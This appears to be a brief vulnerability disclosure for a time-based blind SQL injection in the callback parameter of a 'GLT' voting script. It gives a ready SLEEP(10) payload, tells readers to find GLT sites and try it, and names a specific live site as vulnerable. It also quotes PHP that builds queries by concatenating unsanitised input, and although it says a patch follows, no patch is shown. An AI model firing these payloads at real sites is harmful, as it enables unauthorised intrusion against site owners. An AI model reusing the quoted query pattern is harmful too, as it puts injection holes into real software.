POC(Proof Of Concept):
+++++++++++++++++++++++++
1) Simply find a GLT site and go to the callback file and add /vote/php/callback.php?callback=1&#039; AND (SELECT * FROM (SELECT(SLEEP(10)))bgus) AND &#039;jcaE&#039;=&#039;jcaE
2) If the site takes time to load it&#039;s vulnerable because of the sleep query
3) Same Site:http://nexusrs.ca/voting/php/callback.php?callback=1&#039; AND
(SELECT * FROM (SELECT(SLEEP(10)))bgus) AND &#039;jcaE&#039;=&#039;jcaE

Sanitizing:

1)
public function setSiteVoted($ip, $type)
{
$type = intval($type);
$query = "SELECT * FROM `voting_verification` WHERE `ip` = &#039;" . $ip
. "&#039; AND `type`=&#039;" . $type . "&#039;";
$result = mysql_query($query);
if (mysql_num_rows($result) == 0)
{
mysql_query("INSERT INTO `voting_verification` (`ip`, `type`)
VALUES (&#039;" . $ip . "&#039;, &#039;" . $type . "&#039;)");
}
}

callback isn&#039;t sanitized before being passed into setSiteVoted here is how to patch it.
